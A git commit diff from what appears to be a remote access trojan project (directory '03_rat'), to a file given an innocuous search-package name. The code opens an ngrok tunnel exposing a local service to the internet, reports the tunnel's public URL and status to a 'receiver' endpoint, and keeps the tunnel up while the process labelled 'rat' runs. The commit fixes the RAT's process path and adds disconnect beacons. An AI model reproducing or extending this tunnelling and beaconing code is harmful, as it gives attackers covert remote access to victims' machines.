c52700e3f40496c7614ec5b06213e5d9fa016f1d
Leonid Akinin <fatzy@protonmail.com>
2023-11-11 06:45:56 -0500

    fixed error that cause ngrok disconnection

--- 03_rat/src/pkg_search/search_index.py
+++ 03_rat/src/pkg_search/search_index.py
@@ -2,7 +2,7 @@ import pyngrok, requests, time, psutil
 from pyngrok import ngrok
 
 def is_running():
-    rat = "search_misc.py"
+    rat = "pkg_search/search_misc.py"
     for proc in psutil.process_iter(["pid", "name", "cmdline"]):
         try:
             if proc.info["cmdline"] and rat in proc.info["cmdline"]:
@@ -17,24 +17,31 @@ def is_running():
 
 def main():
     http_tunnel = ngrok.connect(addr="localhost:5000", proto="http")
-    try:
-        response = requests.post(
-            "http://localhost:8080/receiver",
-            json={"ngrok_url": http_tunnel.public_url},
-        )
- 
+    response = requests.post(
+        "http://localhost:8080/receiver",
+        json={"ngrok_status": "tunnel established", "ngrok_url": http_tunnel.public_url,},
+    )
+    try: 
         while True:
             time.sleep(1)
             if not is_running():
                 break
 
     except KeyboardInterrupt:
+        response = requests.post(
+            "http://localhost:8080/receiver",
+            json={"ngrok_status": "tunnel disconnected", "ngrok_url": http_tunnel.public_url,},
+        )
         exit(0)
 
     except requests.RequestException as e:
         exit(0)
 
     finally:
+        response = requests.post(
+            "http://localhost:8080/receiver",
+            json={"ngrok_status": "tunnel disconnected", "ngrok_url": http_tunnel.public_url,},
+        )
         ngrok.disconnect(http_tunnel.public_url)
         exit(0)
 
